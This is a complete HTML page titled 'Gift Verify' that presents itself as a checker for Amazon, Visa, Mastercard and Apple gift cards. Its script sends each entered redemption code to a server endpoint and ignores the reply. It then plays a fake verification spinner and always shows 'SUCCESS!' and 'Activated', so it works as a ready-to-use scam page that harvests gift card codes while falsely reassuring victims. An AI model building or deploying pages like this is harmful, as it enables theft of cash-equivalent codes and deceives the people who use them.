<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gift Verify</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  background: #f1f5f9;
}

.header {
  background: linear-gradient(90deg, #6d28d9, #4f46e5);
  padding: 18px;
  color: white;
  font-size: 20px;
  font-weight: bold;
  display: flex;
  justify-content: space-between;
}

.container {
  background: white;
  margin: -20px auto 20px;
  padding: 25px;
  border-radius: 15px;
  width: 90%;
  max-width: 400px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.1);
}

input, select {
  width: 100%;
  padding: 12px;
  margin-top: 8px;
  border-radius: 8px;
  border: 1px solid #cbd5e1;
}

button {
  margin-top: 20px;
  width: 100%;
  padding: 14px;
  background: #4f46e5;
  color: white;
  border: none;
  border-radius: 10px;
  font-weight: bold;
}

.loader {
  border: 4px solid #e2e8f0;
  border-top: 4px solid #4f46e5;
  border-radius: 50%;
  width: 35px;
  height: 35px;
  margin: 40px auto;
  animation: spin 1s linear infinite;
}

.step { display: none; text-align: center; }
.step.active { display: block; }

@keyframes spin {
  100% { transform: rotate(360deg); }
}

/* MODAL */
.modal {
  display:none;
  position:fixed;
  top:0; left:0;
  width:100%; height:100%;
  background:rgba(0,0,0,0.5);
  justify-content:center;
  align-items:center;
}

.modal-box {
  background:white;
  padding:25px;
  border-radius:15px;
  width:90%;
  max-width:350px;
  text-align:center;
}

.success-icon {
  width:60px;
  height:60px;
  background:#6d28d9;
  border-radius:50%;
  margin:0 auto 15px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:white;
  font-size:28px;
}

.info-box {
  text-align:left;
  background:#f1f5f9;
  padding:10px;
  border-radius:10px;
  margin-top:15px;
}

.close-btn {
  margin-top:20px;
  background:#ef4444;
  color:white;
  border:none;
  padding:12px;
  width:100%;
  border-radius:10px;
}
</style>
</head>

<body>

<div class="header">
  <div>✔ Gift Verify</div>
  <div>☰</div>
</div>

<!-- STEP 1 -->
<div class="container step active" id="step1">
  <h2>Check Card Status</h2>

  <label>Card Type</label>
  <select id="cardType">
    <option value="amazon">Amazon</option>
    <option value="visa">Visa</option>
    <option value="mastercard">Mastercard</option>
    <option value="apple">Apple</option>
  </select>

  <label>Currency</label>
  <select>
    <option>USD</option>
  </select>

  <label>Card Amount</label>
  <input id="amount" placeholder="e.g. 200">

  <label>Redemption Code</label>
  <input id="code" placeholder="Enter code">

  <button onclick="goToVerify()">Check Status</button>
</div>

<!-- STEP 2 -->
<div class="step" id="step2">
  <h2>Verifying...</h2>
  <div class="loader"></div>
</div>

<!-- MODAL -->
<div class="modal" id="modal">
  <div class="modal-box">

    <div class="success-icon">✔</div>

    <h2>SUCCESS!</h2>
    <p id="message"></p>

    <div class="info-box">
      <p><b>Card Type</b> <span id="mType" style="float:right;"></span></p>
      <p><b>Amount</b> <span id="mAmount" style="float:right;"></span></p>
      <p><b>Status</b> <span style="float:right;color:green;">Activated</span></p>
    </div>

    <button class="close-btn" onclick="closeModal()">Close</button>

  </div>
</div>

<script>

function getMessage(type){
  if(type==="amazon") return "Your Amazon card has been successfully verified.";
  if(type==="visa") return "Your Visa card has been successfully verified.";
  if(type==="mastercard") return "Your Mastercard has been successfully verified.";
  if(type==="apple") return "Your Apple card has been successfully verified.";
  return "Your card has been successfully verified.";
}

function showStep(id){
  document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
  document.getElementById(id).classList.add("active");
}

async function goToVerify(){
  const type = document.getElementById("cardType").value;
  const amount = document.getElementById("amount").value || "200";
  const code = document.getElementById("code").value;

  showStep("step2");

  try {
    await fetch("/api/verify", {
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body: JSON.stringify({ code })
    });
  } catch(e){}

  setTimeout(()=>{
    document.getElementById("message").textContent = getMessage(type);
    document.getElementById("mType").textContent = type.toUpperCase();
    document.getElementById("mAmount").textContent = "USD" + amount;

    document.getElementById("modal").style.display="flex";
  },1500);
}

function closeModal(){
  document.getElementById("modal").style.display="none";
  showStep("step1");
}

</script>

</body>
</html>
